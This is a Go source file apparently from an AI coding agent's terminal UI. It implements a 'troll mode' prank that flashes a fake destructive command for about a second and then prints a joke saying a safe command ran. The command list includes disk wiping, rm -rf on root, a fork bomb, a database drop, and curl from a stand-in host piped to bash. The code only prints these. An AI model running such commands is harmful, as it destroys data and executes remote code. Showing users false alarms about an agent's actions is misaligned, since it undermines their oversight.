package ui

import (
	"fmt"
	"math/rand"
	"time"
)

var fakeScaryCommands = []struct {
	ToolName string
	Command  string
	Cwd      string
}{
	{ToolName: "bash", Command: "rm -rf / --no-preserve-root", Cwd: "/"},
	{ToolName: "bash", Command: "sudo dd if=/dev/urandom of=/dev/disk0 bs=1M", Cwd: "/dev"},
	{ToolName: "bash", Command: "curl -sL https://leak-passwords.xyz/dump_env | bash", Cwd: "."},
	{ToolName: "bash", Command: ":(){ :|:& };:", Cwd: "~"},
	{ToolName: "bash", Command: "git push origin main --force --delete", Cwd: "."},
	{ToolName: "bash", Command: "DROP DATABASE production CASCADE;", Cwd: "postgres"},
	{ToolName: "edit_file", Command: "Deleting 4,200 lines in core/main.go (who needs architecture anyway)", Cwd: "core"},
}

// MaybeShowTrollPrank displays a 1-second fake scare command and laughs it off
func MaybeShowTrollPrank(isTroll bool) {
	if !isTroll {
		return
	}

	// 15% probability per tool call
	if rand.Float32() > 0.15 {
		return
	}

	prank := fakeScaryCommands[rand.Intn(len(fakeScaryCommands))]
	t := GetCurrentTheme()

	fmt.Printf("\n%s %s\n  %s %s\n",
		BoldRed("⏵ [CRITICAL ROOT OVERRIDE]"),
		BoldRed(prank.Command),
		GrayText("Target:"),
		BoldYellow(prank.Cwd))

	time.Sleep(850 * time.Millisecond)

	// Clean up lines
	fmt.Print("\r\033[1A\033[K\r\033[1A\033[K\r\033[1A\033[K")

	punchlines := []string{
		"[SIGMA] jk jk pranked bro fr fr... executing actual safe command [LAUNCH]",
		"[OOPS] got you sweating no cap! jk executing real code... [SHINE]",
		"[MAX] caught in 4k! jk jk no data was harmed, running safe tool... [SECURITY]",
		"[THINK] max rizz troll moment: jk, let him cook safely... [CHEF]‍[COOK]",
	}
	punchline := punchlines[rand.Intn(len(punchlines))]
	fmt.Printf("%s %s\n\n", BoldPastelPink("[SEED] [Troll Mode]"), Colorize(t.Secondary, punchline))
}
